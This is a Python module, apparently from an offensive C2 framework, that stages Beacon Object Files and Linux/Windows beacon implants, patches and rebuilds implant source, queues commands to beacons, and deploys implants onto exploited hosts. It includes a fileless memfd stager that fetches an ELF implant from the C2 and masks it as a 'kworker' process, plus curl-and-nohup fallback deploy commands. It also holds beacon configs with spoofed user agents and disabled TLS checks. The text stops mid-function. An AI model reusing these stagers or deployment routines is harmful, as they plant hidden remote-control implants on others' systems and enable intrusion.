"""BOF delivery through the lazyaddon beacon clients.

Beacon Object Files discovered in ``bofs/*.yaml`` travel to the target
exactly as their declaring lazyaddon client describes:

- ``beacon`` (Windows COFF BOFs): the ``bof:url`` command is queued for a
  connected Windows beacon; it downloads the object from the C2
  ``/bof/<name>`` endpoint (raw base64 object, the upstream wire format)
  and runs it through COFFLoader.
- ``blacksandbeacon`` (Linux ELF BOFs): the ``bof:url`` command is queued
  identically; the beacon downloads the position-independent ELF object
  and runs it through its ``RunELF`` loader with the datap argument API.

This module owns the client articulation: it reads the lazyaddon manifests
to compute install paths and staged binaries, stages BOF objects, builds
the delivery command, pushes it to the C2, deploys the client beacon on a
target reached through the atomic exploit bridge, and collects results
from the beacon history. CLI, loop and chains all call these functions.

Contracts:
    - ``BofDeliveryConfig``: paths, timeouts and HTTP knobs.
    - ``queue_to_beacon``: authenticated C2 push (single shared helper).
    - ``stage_bof`` / ``stage_client``: staging of BOF objects and the
      client beacon binary.
    - ``deploy_client``: deliver the beacon binary onto a target with a
      live atomic session and wait for the first check-in.
    - ``run_bof``: queue one BOF command and optionally wait for output.
    - ``recent_beacons``: snapshot of beacons seen by the C2.
"""

from __future__ import annotations

import base64
import json
import logging
import os
import shutil
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import yaml

from modules.beacon_config_builder import generate_bof_execution_command, sanitize_client_id
from modules.bof_registry import (
    BofMarketplace,
    stage_entry_bof,
)

log = logging.getLogger("bof_delivery")

BASE_DIR = Path(__file__).resolve().parent.parent
ADDONS_DIR = BASE_DIR / "lazyaddons"
DEFAULT_SESSIONS_DIR = BASE_DIR / "sessions"
BOF_STAGING_SUBDIR = "temp_uploads/bofs"
BOF_URL_SEGMENT = "bof"
DEFAULT_TIMEOUT_S = 30.0
DEPLOY_WAIT_DEFAULT_S = 45.0
HTTP_TIMEOUT_S = 10.0
_POLL_INTERVAL_S = 1.0
_CLIENT_LOCAL_PATHS: dict[str, str] = {
    "blacksandbeacon": "temp_uploads/blacksandbeacon",
}
_CLIENT_CONFIG_NAMES: dict[str, str] = {
    "blacksandbeacon": "blacksandbeacon_config",
}
_CHECKOUT_CONFIG_RELPATHS: dict[str, tuple[str, ...]] = {
    "blacksandbeacon": ("build/config.json",),
}
_POLL_URI_SEGMENT = "/command/"
_DEFAULT_BEACON_CLIENT_ID = "linux_beacon"
_FILELESS_STAGER_SCRIPT = """import os,ssl,urllib.request,json
u=os.environ["BSB_STAGE_URL"].rstrip("/")
c=ssl._create_unverified_context()
g=lambda p:urllib.request.urlopen(urllib.request.Request(u+p),context=c).read()
e=g("/s/blacksandbeacon");n=g("/s/blacksandbeacon_config")
assert e[:4]==b"\\x7fELF";json.loads(n)
b=os.memfd_create("",0);os.write(b,e)
f=os.memfd_create("",0);os.write(f,n)
if os.fork():os._exit(0)
os.setsid()
v=os.open("/dev/null",os.O_WRONLY)
os.dup2(v,0);os.dup2(v,1);os.dup2(v,2)
os.execve("/proc/self/fd/%d"%b,["[kworker/u8:2]"],dict(os.environ,BSB_CONFIG="/proc/self/fd/%d"%f))
"""
_FILELESS_STAGER_B64 = base64.b64encode(_FILELESS_STAGER_SCRIPT.encode()).decode()
_STAGE_PAYLOAD_RELPATH = "c2/stage_payload.py"


def _stage_payload_b64(external_root: str = "external/.exploit") -> str | None:
    """Return the upstream diskless stager as base64, when available.

    The upstream stager (``c2/stage_payload.py`` inside the
    blacksandbeacon checkout) speaks the token-gated ``/stage/`` contract,
    so the fallback chain prefers it whenever the checkout exists.

    Args:
        external_root: Checked-out beacon repositories root.

    Returns:
        Base64 of the stager script, or None when the checkout is absent.
    """
    path = Path(BASE_DIR) / external_root / "blacksandbeacon" / _STAGE_PAYLOAD_RELPATH
    try:
        source = path.read_bytes()
    except OSError:
        return None
    if b"BSB_STAGE_TOKEN" not in source:
        return None
    return base64.b64encode(source).decode()


_FILELESS_STAGE_TEMPLATES: list[str] = [
    # 1. Upstream diskless stager: token-gated /stage/ endpoints,
    #    AES-CFB + HMAC under HKDF(token), self-signed TLS accepted.
    "echo {stage_payload_b64} | base64 -d | "
    "BSB_STAGE_URL='https://{lhost}:{c2_port}' BSB_STAGE_TOKEN='{stage_token}' "
    "BSB_STAGE_INSECURE_TLS=1 python3 -",
    # 2. Raw /s/ channel: tokenless memfd loader over the implant-stage
    #    files (binary + runtime config staged by stage_client).
    "echo {stager_b64} | base64 -d | "
    "BSB_STAGE_URL='https://{lhost}:{c2_port}' python3 -",
    # 3. Last resort: disk-based bootstrap (visible, but works without
    #    python3-friendliness concerns beyond curl).
    "curl -sk https://{lhost}:{c2_port}/s/blacksandbeacon -o /tmp/.svc ; "
    "curl -sk https://{lhost}:{c2_port}/s/blacksandbeacon_config -o /tmp/config.json ; "
    "chmod 0755 /tmp/.svc && (nohup /tmp/.svc > /dev/null 2>&1 &)",
]
_DEPLOY_COMMANDS: dict[str, list[str]] = {
    "blacksandbeacon": _FILELESS_STAGE_TEMPLATES,
}
_DEPLOY_ATTEMPT_WAIT_S = 8.0


@dataclass
class BofDeliveryConfig:
    """Centralised knobs for the delivery service.

    Attributes:
        sessions_dir: Root of the default payload state.
        addons_dir: Lazyaddon manifest directory.
        external_root: Checked-out beacon repositories root.
        c2_host: Local C2 bind host for authenticated API calls.
        request_timeout: Wall-clock limit for one HTTP call.
        max_records: Cap for one result read.
    """

    sessions_dir: Path = field(default_factory=lambda: DEFAULT_SESSIONS_DIR)
    addons_dir: Path = field(default_factory=lambda: ADDONS_DIR)
    external_root: str = "external/.exploit"
    c2_host: str = "127.0.0.1"
    request_timeout: float = HTTP_TIMEOUT_S
    max_records: int = 50


@dataclass(frozen=True)
class ClientAddon:
    """One lazyaddon beacon client resolved from its YAML manifest.

    Attributes:
        name: addon name (``beacon`` or ``blacksandbeacon``).
        install_path: relative checkout path under ``external/.exploit``.
        repo_url: git repository.
        staged_binary: sessions-relative staged client binary path.
        os_family: target platform of the client.
    """

    name: str
    install_path: str
    repo_url: str
    staged_binary: str
    os_family: str


def load_client_addon(client: str, config: BofDeliveryConfig | None = None) -> ClientAddon:
    """Resolve one beacon client lazyaddon manifest.

    Args:
        client: Lazyaddon name (``beacon`` or ``blacksandbeacon``).
        config: Optional delivery configuration override.

    Returns:
        The resolved :class:`ClientAddon`.

    Raises:
        ValueError: Unknown client name or malformed manifest.
    """
    cfg = config or BofDeliveryConfig()
    name = (client or "").strip().lower()
    allowed = ("beacon", "blacksandbeacon", "blacksandbeacon_bof")
    if name not in allowed:
        raise ValueError(f"unknown BOF beacon client: {client!r} (expected: {', '.join(allowed)})")
    manifest_path = Path(cfg.addons_dir) / f"{name}.yaml"
    try:
        with open(manifest_path, "r", encoding="utf-8") as handle:
            data = yaml.safe_load(handle) or {}
    except Exception as exc:
        raise ValueError(f"client addon {name!r} unreadable: {exc}") from exc
    tool = data.get("tool") if isinstance(data, dict) else None
    if not isinstance(tool, dict):
        raise ValueError(f"client addon {name!r} has no tool section")
    install_path = str(tool.get("install_path", "") or "").strip()
    if not install_path or install_path.startswith("/") or ".." in Path(install_path).parts:
        raise ValueError(f"client addon {name!r} install_path unsafe: {install_path!r}")
    staged = _CLIENT_LOCAL_PATHS.get(name, "")
    os_family = str(data.get("os", "any")).strip().lower()
    return ClientAddon(
        name=name,
        install_path=install_path,
        repo_url=str(tool.get("repo_url", "") or "").strip(),
        staged_binary=staged,
        os_family=os_family,
    )


def staging_dir(config: BofDeliveryConfig | None = None) -> Path:
    """Return (and create) the BOF staging directory.

    Args:
        config: Optional delivery configuration override.

    Returns:
        The ``sessions/temp_uploads/bofs`` directory path.
    """
    cfg = config or BofDeliveryConfig()
    path = Path(cfg.sessions_dir) / BOF_STAGING_SUBDIR
    path.mkdir(parents=True, exist_ok=True)
    return path


def stage_bof(name: str, config: BofDeliveryConfig | None = None) -> str | None:
    """Stage one catalog BOF for delivery through its client.

    Args:
        name: Catalog BOF name (matches a ``bofs/*.yaml`` name).
        config: Optional delivery configuration override.

    Returns:
        The staged path, or None when nothing compiled is available.
    """
    cfg = config or BofDeliveryConfig()
    marketplace = BofMarketplace(sessions_dir=str(Path(cfg.sessions_dir)))
    try:
        entry = marketplace.catalog.get(name)
    except KeyError as exc:
        raise KeyError(str(exc)) from exc
    return stage_entry_bof(entry, sessions_dir=str(Path(cfg.sessions_dir)))


def beacon_runtime_config(
    client: str,
    client_id: str,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Build the C2-aligned beacon runtime configuration.

    The configuration mirrors the lazyaddon example but rewires every
    endpoint onto the LazyOwn C2 contract: the poll URL becomes
    ``{c2.url}{uri}{client_id}`` on ``/command/``, the result report
    posts to the same ``/command/<client_id>`` route, and the AES key
    matches the C2's on-disk ``sessions/key.aes``. HMAC can stay enabled
    on the C2 only when the client signs requests; the packaged Linux
    client does not, so the operator payload must carry
    ``c2_require_beacon_hmac: false`` for this client.

    Args:
        client: Lazyaddon client name.
        client_id: Beacon client id the session will poll with.
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        A config dict ready for ``json.dump`` next to the beacon binary.

    Raises:
        ValueError: Malformed client id or missing AES key.
    """
    from core.config import load_payload

    cfg = config or BofDeliveryConfig()
    data = payload if payload is not None else load_payload()
    clean_id = sanitize_client_id(client_id)
    lhost = str(data.get("lhost", "127.0.0.1"))
    c2_port = str(data.get("c2_port", "4444"))
    url = f"https://{lhost}:{c2_port}"
    key_path = Path(cfg.sessions_dir) / "key.aes"
    if not key_path.is_file():
        raise ValueError(f"missing C2 AES key at {key_path} (boot the C2 once to generate it)")
    key_hex = key_path.read_bytes().hex()
    return {
        "c2": {
            "url": url,
            "uri": _POLL_URI_SEGMENT,
            "client_id": clean_id,
            "port": int(c2_port) if c2_port.isdigit() else 4444,
            "report_uri": f"{_POLL_URI_SEGMENT}{clean_id}",
            "log_dir": "sessions/logs",
            "upload_dir": "sessions/uploads",
        },
        "crypto": {
            "master_key_hex": key_hex,
            "aes_key_hex": key_hex,
            "mode": "cfb",
            "replay_window_seconds": 300,
        },
        "timing": {
            "sleep_seconds": 6,
            "jitter_percent": 20,
            "curl_timeout_seconds": 10,
            "curl_connect_timeout_seconds": 5,
        },
        "network": {
            "user_agents": [
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Firefox/120.0",
            ],
            "verify_tls": False,
        },
        "bof": {"download_chunk_size": 4096, "output_buffer_size": 65536},
        "backoff": {"base_seconds": 6, "max_seconds": 300},
    }


def write_client_config(
    client: str,
    client_id: str,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> list[str]:
    """Write the generated runtime config into the addon checkout and staging dir.

    Args:
        client: Lazyaddon client name.
        client_id: Beacon client id.
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        Paths written (checkout config plus the staged config copy).

    Raises:
        ValueError: Unknown client or missing checkout.
    """
    cfg = config or BofDeliveryConfig()
    addon = load_client_addon(client, cfg)
    config_names = _CLIENT_CONFIG_NAMES.get(addon.name)
    relpaths = _CHECKOUT_CONFIG_RELPATHS.get(addon.name)
    if not config_names or not relpaths:
        return []
    document = beacon_runtime_config(addon.name, client_id, cfg, payload)
    checkout = Path(BASE_DIR) / addon.install_path
    if not checkout.is_dir():
        raise ValueError(f"client checkout missing: {checkout}")
    written: list[str] = []
    for relpath in relpaths:
        target = checkout / relpath
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(json.dumps(document, indent=2), encoding="utf-8")
        written.append(str(target))
    staged = Path(cfg.sessions_dir) / "temp_uploads" / config_names
    staged.write_text(json.dumps(document, indent=2), encoding="utf-8")
    written.append(str(staged))
    return written


def stage_client(
    client: str,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> str:
    """Compile and stage a beacon client through its lazyaddon tool.

    Runs the addon ``tool.execute_command`` from the addon install path
    with the shared safe shell primitive, then rewrites the checkout
    runtime config to the LazyOwn C2 contract so the staged binary checks
    in with the operator's endpoints and key on first run.

    Args:
        client: Lazyaddon client name.
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        The staged binary path (sessions-relative).

    Raises:
        ValueError: Unknown client or missing staged binary after the run.
    """
    from core.config import load_payload
    from core.safe_exec import safe_run_shell

    cfg = config or BofDeliveryConfig()
    data = payload if payload is not None else load_payload()
    addon = load_client_addon(client, cfg)
    checkout = Path(BASE_DIR) / addon.install_path
    if not checkout.is_dir():
        raise ValueError(f"client checkout missing: {checkout} (run the {addon.name} lazyaddon install first)")
    with open(Path(cfg.addons_dir) / f"{addon.name}.yaml", "r", encoding="utf-8") as handle:
        manifest = yaml.safe_load(handle) or {}
    tool = manifest.get("tool") or {}
    execute_command = str(tool.get("execute_command", "") or "").strip()
    if not execute_command:
        raise ValueError(f"client addon {addon.name!r} declares no execute_command")
    result = safe_run_shell(
        execute_command,
        allow=True,
        reason=f"stage BOF client {addon.name} for delivery",
        timeout=600,
        cwd=str(checkout),
    )
    if result.returncode != 0:
        log.warning("stage_client %s exited %s", addon.name, result.returncode)
    if result.stdout:
        log.info("stage_client %s: %s", addon.name, result.stdout[-400:])
    _apply_upstream_report_patch(addon, cfg)
    client_id = str(data.get("beacon_client_id", "") or _DEFAULT_BEACON_CLIENT_ID).strip() or _DEFAULT_BEACON_CLIENT_ID
    try:
        write_client_config(addon.name, client_id, cfg, data)
    except ValueError as exc:
        if key_missing_from_error(exc):
            raise
        log.warning("client config not written: %s", exc)
    staged = _CLIENT_LOCAL_PATHS.get(addon.name)
    if staged is None:
        return ""
    staged_path = Path(cfg.sessions_dir) / staged
    if not staged_path.is_file():
        raise ValueError(f"no client binary staged for {addon.name!r}: expected {staged_path}")
    _raw_stage_for_implant_serving(addon.name, staged_path, cfg)
    return str(staged_path)


def _raw_stage_for_implant_serving(addon_name: str, binary_path: Path, config: BofDeliveryConfig) -> None:
    """Copy the staged client into ``sessions/`` so ``/s/<name>`` serves it.

    The raw ``/s/`` route serves only the fixed implant-stage file names;
    it is the bootstrap channel the beacon itself downloads its binary
    and runtime config from before the encrypted beacon protocol works.

    Args:
        addon_name: Client addon name.
        binary_path: Staged binary path under ``sessions/temp_uploads/``.
        config: Delivery configuration holding the sessions root.
    """
    config_name = _CLIENT_CONFIG_NAMES.get(addon_name)
    if not config_name:
        return
    try:
        shutil.copy2(binary_path, Path(config.sessions_dir) / addon_name)
        config_file = Path(config.sessions_dir) / "temp_uploads" / config_name
        if config_file.is_file():
            shutil.copy2(config_file, Path(config.sessions_dir) / config_name)
    except OSError as exc:
        log.warning("raw stage copy failed: %s", exc)


_PATCH_SOURCE_RELPATH = "beacons/v1/beacon.c"
_PATCH_AES_RELPATH = "include/aes_cfb.c"
_PATCH_AES_MARKER = "EVP_CIPHER_CTX_new"
_PATCH_AES_BEGIN = "#include <openssl/evp.h>\n#include <stdlib.h>"
_PATCH_AES_HEADER = '#include "aes.h"\n#include <stdlib.h>'
_PATCH_ORIGINAL = r"""            size_t base_len = strlen(report_url);
            size_t b64_len = strlen(b64_resp);
            size_t enc_len = 0;
            char *b64_encoded = url_encode(b64_resp, b64_len, &enc_len);
            if (b64_encoded && base_len + enc_len + 1 <= sizeof(report_url)) {
                memcpy(report_url + base_len, b64_encoded, enc_len);
                report_url[base_len + enc_len] = '\0';
                http_response_t resp = https_request(cfg, report_url, "POST", NULL);
                free(resp.data);
                free(b64_encoded);
            }
            free(b64_resp);
"""

_PATCH_REPLACEMENT = """            /* Pathable C2 (/command/<client_id>) matches the client id
             * from the route, so the encrypted payload must travel in
             * the POST body, never appended to the URL segment. */
            http_response_t resp = https_request(cfg, report_url, "POST", b64_resp);
            free(resp.data);
            free(b64_resp);
"""


def _apply_upstream_report_patch(addon: ClientAddon, config: BofDeliveryConfig) -> bool:
    """Keep the client beacon on the C2 wire protocol.

    Two upstream fixes are applied idempotently after every stage run
    (the addon's ``execute_command`` re-resets the checkout each time):

    1. Report bodies travel as POST data (never appended to the URL
       segment), so the C2 matches the report to the beacon client id.
    2. AES-256-CFB runs through OpenSSL EVP so multi-block commands
       decrypt identically to the python ``cryptography`` C2 (the
       in-repo trivial-CFB variant disagrees past the first block).

    An already-patched (or upstream-fixed) checkout is left untouched.

    Args:
        addon: Resolved client addon.
        config: Delivery configuration override.

    Returns:
        True when any patch was applied and the client rebuilt.
    """
    if addon.name != "blacksandbeacon":
        return False
    from core.safe_exec import safe_run_shell

    checkout = Path(BASE_DIR) / addon.install_path
    touched = False
    source_path = checkout / _PATCH_SOURCE_RELPATH
    try:
        source = source_path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        log.warning("client source unreadable at %s: %s", source_path, exc)
        return False
    if '"POST", b64_resp)' not in source and _PATCH_ORIGINAL in source:
        touched = True
        source_path.write_text(source.replace(_PATCH_ORIGINAL, _PATCH_REPLACEMENT, 1), encoding="utf-8")
        log.info("report-body patch applied (%s)", source_path)
    elif '"POST", b64_resp)' in source:
        log.info("client source already reports via body (%s)", source_path)
    else:
        log.warning("report patch skipped: source drifted at %s", source_path)
    aes_path = checkout / _PATCH_AES_RELPATH
    try:
        aes_source = aes_path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        log.warning("aes source unreadable at %s: %s", aes_path, exc)
        return False
    if _PATCH_AES_MARKER not in aes_source and _PATCH_AES_HEADER in aes_source:
        marker = (
            "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n"
            "                                  const unsigned char* plaintext, size_t len, int* out_len) {\n"
            "    struct AES_ctx ctx;\n"
        )
        start = aes_source.index(marker)
        tail_marker = "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,"
        end = aes_source.index(tail_marker)
        header = aes_source[:start]
        comment = "\n".join(
            line
            for line in header.splitlines()
            if line.startswith("/*") or line.startswith(" *") or line.startswith(" */")
        )
        helper = (
            "\n/* Shared AES-256-CFB primitive (OpenSSL EVP) — mirrors the CFB128\n"
            " * implementation the python C2 uses, so multi-block payloads decrypt\n"
            " * identically on both ends. */\n"
            "static unsigned char* _bsb_evp_crypt(const unsigned char* key, const unsigned char* iv,\n"
            "                                     const unsigned char* data, size_t len, int* out_len,\n"
            "                                     int encrypt_mode) {\n"
            "    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n"
            "    if (!ctx) return NULL;\n"
            "    unsigned char* buffer = (unsigned char*)malloc(len + 2);\n"
            "    if (!buffer) { EVP_CIPHER_CTX_free(ctx); return NULL; }\n"
            "    int outl = 0, outl2 = 0;\n"
            "    int ok = encrypt_mode\n"
            "        ? (EVP_EncryptInit_ex(ctx, EVP_aes_256_cfb(), NULL, key, iv) == 1\n"
            "           && EVP_EncryptUpdate(ctx, buffer, &outl, data, (int)len) == 1\n"
            "           && EVP_EncryptFinal_ex(ctx, buffer + outl, &outl2) == 1)\n"
            "        : (EVP_DecryptInit_ex(ctx, EVP_aes_256_cfb(), NULL, key, iv) == 1\n"
            "           && EVP_DecryptUpdate(ctx, buffer, &outl, data, (int)len) == 1\n"
            "           && EVP_DecryptFinal_ex(ctx, buffer + outl, &outl2) == 1);\n"
            "    EVP_CIPHER_CTX_free(ctx);\n"
            "    if (!ok) { free(buffer); return NULL; }\n"
            "    *out_len = outl + outl2;\n"
            "    return buffer;\n"
            "}\n\n"
        )
        enc_replacement = (
            "unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,\n"
            "                                  const unsigned char* plaintext, size_t len, int* out_len) {\n"
            "    return _bsb_evp_crypt(key, iv, plaintext, len, out_len, 1);\n"
            "}\n\n"
        )
        dec_replacement = (
            "unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,\n"
            "                                  const unsigned char* ciphertext, size_t len, int* out_len) {\n"
            "    unsigned char* plaintext = _bsb_evp_crypt(key, iv, ciphertext, len, out_len, 0);\n"
            "    if (plaintext) plaintext[*out_len] = '\\0';\n"
            "    return plaintext;\n"
            "}\n"
        )
        comment = "\n/*\n * aes_cfb.c - AES-256-CFB encrypt/decrypt routed through OpenSSL EVP.\n *\n * Public API:\n *   unsigned char* aes256_cfb_encrypt(key, iv, plain, len, &out_len);\n *   unsigned char* aes256_cfb_decrypt(key, iv, cipher, len, &out_len);\n *\n * Both return a malloc'd buffer the caller must free.\n */\n"
        aes_source = (
            "#include <openssl/evp.h>\n#include <stdlib.h>\n" + comment + helper + enc_replacement + dec_replacement
        )
        touched = True
        aes_path.write_text(aes_source, encoding="utf-8")
        log.info("AES EVP patch applied (%s)", aes_path)
    elif "CFB-128 mode used by the Python C2" in aes_source:
        log.info("upstream AES is already CFB-128 python-compatible (%s)", aes_path)
    else:
        log.info("aes source already EVP-based (%s)", aes_path)
    if not touched:
        return False
    rebuild = safe_run_shell(
        "make beacon-v1 && install -m 0755 build/beacon-v1 build/beacon",
        allow=True,
        reason=f"rebuild {addon.name} with the wire-protocol patches",
        timeout=600,
        cwd=str(checkout),
    )
    if rebuild.returncode != 0:
        log.warning("client rebuild failed: %s", (rebuild.stderr or "")[-300:])
        return False
    staged_path = Path(config.sessions_dir) / _CLIENT_LOCAL_PATHS[addon.name]
    try:
        shutil.copy2(checkout / "build" / "beacon", staged_path)
    except OSError as exc:
        log.warning("re-staged copy failed: %s", exc)
    log.info("rebuilt %s with the wire-protocol patches", addon.name)
    return True


def key_missing_from_error(exc: Exception) -> bool:
    """Return True when the error text points at a missing AES key.

    Args:
        exc: The caught exception.

    Returns:
        True when the stage flow must stop (key absence is fatal, config
        write failures for other reasons only degrade to a warning).
    """
    text = str(exc)
    return "key.aes" in text


def delivery_command(
    bof_name: str,
    c2_url: str,
    args: list[str] | None = None,
    bofs_dir: str = BOF_URL_SEGMENT,
) -> str:
    """Build the ``bof:`` delivery command for one BOF.

    Args:
        bof_name: Catalog BOF name.
        c2_url: C2 base URL (``https://<lhost>:<c2_port>``).
        args: Optional argument list joined with commas.
        bofs_dir: URL segment serving the staged BOFs.

    Returns:
        The command string.

    Raises:
        ValueError: Invalid tokens (see beacon_config_builder).

    Raises:
        ValueError: When any token breaks the ``bof:`` contract.
    """
    return generate_bof_execution_command(bof_name, c2_url, args=args, bofs_dir=bofs_dir)


def _c2_channel_base(cfg: BofDeliveryConfig, payload: dict[str, Any]) -> str:
    """Return the base URL of the C2 channel for operator-side API calls.

    The C2 binds ``c2_bind_address`` (else ``lhost``), so operator-side
    queueing must target the same address the beacons poll: the payload
    lhost, falling back to the configured loopback host when lhost is a
    wildcard or missing.

    Args:
        cfg: Delivery configuration holding the fallback host.
        payload: Payload mapping with lhost and c2_port.

    Returns:
        A base URL without a trailing slash.
    """
    host = str(payload.get("lhost", "") or "").strip()
    if not host or host in ("0.0.0.0", "::", ""):
        host = cfg.c2_host
    port = str(payload.get("c2_port", "4444"))
    return f"https://{host}:{port}"


def queue_to_beacon(
    client_id: str,
    command: str,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> bool:
    """Queue one command for a connected beacon through the C2 API.

    Posts the form to ``https://<lhost>:<c2_port>/issue_command`` with
    Basic auth taken from the payload configuration. Self-signed
    certificates are accepted because the C2 channel is already
    end-to-end encrypted by the beacon protocol itself.

    Args:
        client_id: Beacon client id (validated).
        command: Full command string (e.g. ``bof:https://...``).
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        True when the C2 accepted the command.

    Raises:
        ValueError: Malformed client id.
    """
    from core.config import load_payload

    cfg = config or BofDeliveryConfig()
    clean_id = sanitize_client_id(client_id)
    data = payload if payload is not None else load_payload()
    base = _c2_channel_base(cfg, data)
    user = str(data.get("c2_user", "LazyOwn"))
    password = str(data.get("c2_pass", "LazyOwn"))
    url = f"{base}/issue_command"
    form = urllib.parse.urlencode({"client_id": clean_id, "command": command}).encode()
    auth = base64.b64encode(f"{user}:{password}".encode()).decode()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    request = urllib.request.Request(
        url,
        data=form,
        method="POST",
        headers={
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=cfg.request_timeout, context=context) as response:
            if response.status in (200, 302):
                log.info("queued %s for beacon %s", command[:60], clean_id)
                return True
            log.error("C2 %s rejected command with HTTP %s", url, response.status)
            return False
    except urllib.error.HTTPError as exc:
        log.error("C2 rejected command (HTTP %s)", exc.code)
        return False
    except Exception as exc:
        log.error("failed to reach C2 at %s: %s", url, exc)
        return False


def recent_beacons(
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> list[dict[str, Any]]:
    """Return the beacons currently seen by the C2.

    Queries the authenticated ``/api/dashboard`` endpoint; falls back to
    the on-disk beacon history files when the C2 is not reachable.

    Args:
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        A list of ``{client_id, hostname, user, last_seen}`` dicts.
    """
    from core.config import load_payload

    cfg = config or BofDeliveryConfig()
    data = payload if payload is not None else load_payload()
    base = _c2_channel_base(cfg, data)
    user = str(data.get("c2_user", "LazyOwn"))
    password = str(data.get("c2_pass", "LazyOwn"))
    url = f"{base}/api/dashboard"
    auth = base64.b64encode(f"{user}:{password}".encode()).decode()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    request = urllib.request.Request(url, headers={"Authorization": f"Basic {auth}"})
    try:
        with urllib.request.urlopen(request, timeout=cfg.request_timeout, context=context) as response:
            body = json.loads(response.read().decode("utf-8", "replace"))
        beacons = body.get("active_beacons") or []
        if isinstance(beacons, list):
            return [item if isinstance(item, dict) else {"client_id": str(item)} for item in beacons]
    except Exception as exc:
        log.debug("dashboard query failed: %s", exc)
    return _beacons_from_history(cfg)


def _beacons_from_history(config: BofDeliveryConfig) -> list[dict[str, Any]]:
    """Derive a beacon snapshot from the on-disk beacon history files."""
    records: dict[str, dict[str, Any]] = {}
    pattern = "*.records.jsonl"
    for path in sorted(Path(config.sessions_dir).glob(pattern), key=lambda p: p.stat().st_mtime, reverse=True):
        client_id = path.name[: -len(".records.jsonl")]
        try:
            with open(path, "r", encoding="utf-8") as handle:
                lines = handle.readlines()[-1:]
        except OSError:
            continue
        for line in lines:
            try:
                record = json.loads(line)
            except json.JSONDecodeError:
                continue
            records[client_id] = {
                "client_id": client_id,
                "hostname": record.get("hostname", ""),
                "user": record.get("user", ""),
                "last_seen": record.get("timestamp", ""),
            }
            break
    return list(records.values())


def wait_for_beacon(
    client_id: str | None = None,
    since: float | None = None,
    timeout: float = DEPLOY_WAIT_DEFAULT_S,
    config: BofDeliveryConfig | None = None,
    payload: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """Wait until a beacon answers, then return its latest record.

    Args:
        client_id: Expected beacon id; None accepts any new beacon.
        since: Epoch timestamp; only records newer than it count.
        timeout: Wall-clock limit.
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        The latest beacon record, or None after the timeout.
    """
    from modules.beacon_history import read_records

    cfg = config or BofDeliveryConfig()
    history_cfg = _history_config(cfg)
    deadline = time.time() + max(1.0, timeout)
    candidates: set[str] = {client_id} if client_id else set()
    while time.time() < deadline:
        if client_id:
            try:
                rows = read_records(client_id, config=history_cfg)
            except Exception:
                rows = []
            for row in reversed(rows):
                if _record_after(row, since):
                    return row
        else:
            recent = _beacons_from_history(cfg)
            for row in recent:
                fresh = Path(cfg.sessions_dir) / f"{row['client_id']}.records.jsonl"
                try:
                    if fresh.stat().st_mtime >= (since or 0):
                        return row
                except OSError:
                    continue
        if not candidates:
            for path in Path(cfg.sessions_dir).glob("*.records.jsonl"):
                try:
                    if path.stat().st_mtime >= (since or 0):
                        candidates.add(path.name[: -len(".records.jsonl")])
                except OSError:
                    continue
        time.sleep(_POLL_INTERVAL_S)
    return None


def _record_after(row: dict[str, Any], since: float | None) -> bool:
    """Return True when a beacon history record is newer than ``since``.

    Args:
        row: One beacon history record.
        since: Epoch timestamp (None means accept any).

    Returns:
        True when the record qualifies.
    """
    if since is None:
        return True
    stamp = str(row.get("timestamp", ""))
    if not stamp:
        return True
    try:
        from datetime import datetime

        moment = datetime.fromisoformat(stamp.replace("Z", "+00:00"))
        return moment.timestamp() >= since
    except ValueError:
        return True


def c2_reachable(config: BofDeliveryConfig | None = None, payload: dict[str, Any] | None = None) -> bool:
    """Return True when the C2 answers an authenticated API query.

    The check performs a live ``/api/dashboard`` GET with the payload
    credentials; raw history fallbacks are explicitly not counted, so a
    stale sessions directory never fakes a running server.

    Args:
        config: Optional delivery configuration override.
        payload: Optional payload.json mapping override (tests).

    Returns:
        True when the C2 responds over HTTPS.
    """
    from core.config import load_payload

    cfg = config or BofDeliveryConfig()
    data = payload if payload is not None else load_payload()
    base = _c2_channel_base(cfg, data)
    user = str(data.get("c2_user", "LazyOwn"))
    password = str(data.get("c2_pass", "LazyOwn"))
    url = f"{base}/api/dashboard"
    auth = base64.b64encode(f"{user}:{password}".encode()).decode()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
